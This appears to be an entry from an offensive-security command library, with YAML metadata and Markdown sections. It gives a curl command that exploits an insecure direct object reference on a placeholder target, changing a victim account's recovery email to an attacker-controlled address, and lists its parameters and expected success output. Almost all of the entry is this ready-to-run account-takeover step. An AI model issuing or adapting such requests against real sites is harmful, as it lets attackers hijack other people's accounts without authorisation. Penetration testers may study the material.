---
data: >-
  curl -X POST https://target-site.com/self -H "Cookie: session=valid_session"
  -H "__RequestVerificationToken: token_value" -d
  "userName=victim_username&originalEmail=victim@example.com&Email=victim@example.com&RecoveryEmail=attacker@example.com"
  -v
tags:
  - idor
  - manipulation
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.453Z'
id: af256981-6227-45c6-9ac1-c719714577c4
verified: false
validated: true
submitted: true
---
# curl-modify-recovery-email

## Command

```bash
curl -X POST https://target-site.com/self \
  -H "Cookie: session=valid_session" \
  -H "__RequestVerificationToken: token_value" \
  -d "userName=victim_username&originalEmail=victim@example.com&Email=victim@example.com&RecoveryEmail=attacker@example.com" \
  -v
```

## Description

Modifies /self to add attacker's recovery email via IDOR.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d "userName=..."` | Victim username | Yes |
| `-d "RecoveryEmail=..."` | Attacker email | Yes |
| Other headers/data as above | Auth and form | Yes |

## Examples

### Basic Usage

Tamper parameters in a captured request.

## Expected Output

200 OK indicating successful update.

## Related

- [[Related Procedure: Modify-Self-Request-to-Add-Attacker-Recovery-Email]]
